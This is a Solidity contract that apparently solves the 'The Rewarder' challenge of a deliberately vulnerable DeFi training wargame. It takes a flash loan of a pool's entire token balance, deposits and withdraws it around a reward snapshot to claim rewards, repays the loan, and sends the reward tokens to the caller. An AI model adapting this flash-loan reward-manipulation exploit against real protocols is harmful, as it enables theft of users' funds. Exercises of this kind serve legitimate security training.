// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/RewardToken.sol";

contract RewarderAttack {
    FlashLoanerPool public pool;
    DamnValuableToken public token;
    TheRewarderPool public rewardPool;
    RewardToken public reward;

    constructor(address _pool, address _token, address _rewardPool, address _reward) {
        pool = FlashLoanerPool(_pool);
        token = DamnValuableToken(_token);
        rewardPool = TheRewarderPool(_rewardPool);
        reward = RewardToken(_reward);
    }

    fallback() external {
        // STEP 2 - Deposit the flashloan to hopefully get the snapshot taken 
        uint bal = token.balanceOf(address(this));

        token.approve(address(rewardPool), bal);
        rewardPool.deposit(bal);
        rewardPool.withdraw(bal);

        token.transfer(address(pool), bal);
    }

    /** EXPLOIT - If we have a huge number of tokens deposited */
    function attack() external {
        // STEP 1 - flash loan the token balance
        pool.flashLoan(token.balanceOf(address(pool)));
        // STEP 3 - transfer the reward tokens distributed on the snapshot, to the attacker
        reward.transfer(msg.sender, reward.balanceOf(address(this)));
    }
}